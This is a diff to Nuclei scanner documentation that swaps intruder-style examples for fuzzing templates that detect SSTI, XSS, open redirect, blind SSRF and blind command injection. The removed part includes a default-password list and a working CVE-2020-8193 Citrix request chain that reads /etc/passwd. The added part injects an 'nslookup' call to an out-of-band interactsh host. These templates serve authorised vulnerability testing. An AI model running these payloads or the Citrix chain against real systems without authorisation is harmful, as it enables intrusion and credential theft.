@@ -1,213 +1,205 @@
-### HTTP Intruder fuzzing
+### Basic SSTI Template
 
-This template makes a defined POST request in RAW format along with in template defined payloads running `clusterbomb` intruder and checking for string match against response.
-
+A simple template to discover `{{<number>*<number>}}` type SSTI vulnerabilities.
 
 ```yaml
-id: multiple-raw-example
-info:
-  name: Test RAW Template
-  author: pdteam
-  severity: info
+id: fuzz-reflection-ssti
 
-# HTTP Intruder fuzzing with in template payload support. 
+info:
+  name: Basic Reflection Potential SSTI Detection
+  author: pdteam
+  severity: low
+
+variables:
+  first: "{{rand_int(10000, 99999)}}"
+  second: "{{rand_int(10000, 99999)}}"
+  result: "{{to_number(first)*to_number(second)}}"
 
 requests:
-
-  - raw:
-      - |
-        POST /?username=§username§&paramb=§password§ HTTP/1.1
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5)
-        Host: {{Hostname}}
-        another_header: {{base64('§password§')}}
-        Accept: */*
-        body=test
-
+  - method: GET
+    path:
+      - "{{BaseURL}}"
     payloads:
-      username:
-        - admin
-
-      password:
-        - admin
-        - guest
-        - password
-        - test
-        - 12345
-        - 123456
-
-    attack: clusterbomb # Available: batteringram,pitchfork,clusterbomb
-
+      reflection:
+        - '{{concat("{{", "§first§*§second§", "}}")}}'
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: multiple
+        fuzz:
+          - "{{reflection}}"
     matchers:
       - type: word
+        part: body
         words:
-          - "Test is test matcher text"
+          - "{{result}}"
 ```
 
-### Fuzzing multiple requests 
+### Basic XSS Template
 
-This template makes a defined POST request in RAW format along with wordlist based payloads running `clusterbomb` intruder and checking for string match against response.
+A simple template to discover XSS probe reflection in HTML pages.
 
 ```yaml
-id: multiple-raw-example
+id: fuzz-reflection-xss
+
 info:
-  name: Test RAW Template
+  name: Basic Reflection Potential XSS Detection
   author: pdteam
-  severity: info
+  severity: low
 
 requests:
-
-  - raw:
-      - |
-        POST /?param_a=§param_a§&paramb=§param_b§ HTTP/1.1
-        User-Agent: §param_a§
-        Host: {{Hostname}}
-        another_header: {{base64('§param_b§')}}
-        Accept: */*
-
-        admin=test
-
-      - |
-        DELETE / HTTP/1.1
-        User-Agent: nuclei
-        Host: {{Hostname}}
-
-        {{sha256('§param_a§')}} 
-
-      - |
-        PUT / HTTP/1.1
-        Host: {{Hostname}}
-
-        {{html_escape('§param_a§')}} + {{hex_encode('§param_b§'))}}
-
-    attack: clusterbomb # Available types: batteringram,pitchfork,clusterbomb
+  - method: GET
+    path:
+      - "{{BaseURL}}"
     payloads:
-      param_a: payloads/prams.txt
-      param_b: payloads/paths.txt
-
+      reflection:
+        - "6842'\"><9967"
+    stop-at-first-match: true
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+    matchers-condition: and
     matchers:
       - type: word
+        part: body
         words:
-          - "Test is test matcher text"
+          - "{{reflection}}"
+      - type: word
+        part: header
+        words:
+          - "text/html"
 ```
 
+### Basic OpenRedirect Template
 
-### Authenticated fuzzing
-
-This template makes a subsequent HTTP requests with defined requests maintaining sessions between each request and checking for string match against response.
+A simple template to discover open-redirects issues.
 
 ```yaml
-id: multiple-raw-example
+id: fuzz-open-redirect
+
 info:
-  name: Test RAW Template
+  name: Basic Open Redirect Detection
   author: pdteam
-  severity: info
+  severity: low
 
 requests:
-  - raw:
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        Origin: {{BaseURL}}
-
-      - |
-        POST /testing HTTP/1.1
-        Host: {{Hostname}}
-        Origin: {{BaseURL}}
-
-        testing=parameter
-
-    cookie-reuse: true # Cookie-reuse maintain the session between all request like browser. 
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      redirect:
+        - "https://example.com"
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        keys-regex:
+          - "redirect.*"
+        fuzz:
+          - "{{redirect}}"
+    matchers-condition: and
     matchers:
       - type: word
+        part: header
         words:
-          - "Test is test matcher text"
+          - "{{redirect}}"
+      - type: status
+        status:
+          - 301
+          - 302
+          - 307
 ```
 
-### Dynamic variable support
+### Blind SSRF OOB Detection
 
-This template makes a subsequent HTTP requests maintaining sessions between each request, dynamically extracting data from one request and reusing them into another request using variable name and checking for string match against response.
+A simple template to detect Blind SSRF in known-parameters using interact.sh with HTTP fuzzing.
 
 ```yaml
-id: CVE-2020-8193
+id: fuzz-ssrf
 
 info:
-  name: Citrix unauthenticated LFI
+  name: Basic Blind SSRF Detection
   author: pdteam
-  severity: high
-  reference: https://github.com/jas502n/CVE-2020-8193
+  severity: low
 
 requests:
-  - raw:
-      - |
-        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
-        Content-Type: application/xml
-        X-NITRO-USER: xpyZxwy6
-        X-NITRO-PASS: xWXHUJ56
-
-        <appfwprofile><login></login></appfwprofile>
-
-      - |
-        GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: python-requests/2.24.0
-        Accept: */*
-        Connection: close
-
-      - |
-        GET /menu/neo HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: python-requests/2.24.0
-        Accept: */*
-        Connection: close
-
-      - |
-        GET /menu/stc HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: python-requests/2.24.0
-        Accept: */*
-        Connection: close
-
-      - |
-        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: python-requests/2.24.0
-        Accept: */*
-        Connection: close
-        Content-Type: application/xml
-        X-NITRO-USER: oY39DXzQ
-        X-NITRO-PASS: ZuU9Y9c1
-        rand_key: §randkey§
-
-        <appfwprofile><login></login></appfwprofile>
-
-      - |
-        POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: python-requests/2.24.0
-        Accept: */*
-        Connection: close
-        Content-Type: application/xml
-        X-NITRO-USER: oY39DXzQ
-        X-NITRO-PASS: ZuU9Y9c1
-        rand_key: §randkey§
-
-        <clipermission></clipermission>
-
-    cookie-reuse: true # Using cookie-reuse to maintain session between each request, same as browser.
-
-    extractors:
-      - type: regex
-        name: randkey # Variable name
-        part: body
-        internal: true
-        regex:
-          - "(?m)[0-9]{3,10}\\.[0-9]+"
-
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      redirect:
+        - "{{interactsh-url}}"
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        keys:
+          - "dest"
+          - "redirect"
+          - "uri"
+          - "path"
+          - "continue"
+          - "url"
+          - "window"
+          - "next"
+          - "data"
+          - "reference"
+          - "site"
+          - "html"
+          - "val"
+          - "validate"
+          - "domain"
+          - "callback"
+          - "return"
+          - "page"
+          - "feed"
+          - "host"
+          - "port"
+          - "to"
+          - "out"
+          - "view"
+          - "dir"
+          - "show"
+          - "navigation"
+          - "open"
+        fuzz:
+          - "https://{{redirect}}"
+    matchers-condition: and
     matchers:
-      - type: regex
-        regex:
-          - "root:[x*]:0:0:"
-        part: body
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "http"
+```
+
+### Blind CMDi OOB based detection
+
+A simple template to detect blind CMDI using interact.sh
+
+```yaml
+id: fuzz-cmdi
+
+info:
+  name: Basic Blind CMDI Detection
+  author: pdteam
+  severity: low
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      redirect:
+        - "{{interactsh-url}}"
+    fuzzing:
+        fuzz:
+          - "nslookup {{redirect}}"
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
 ```
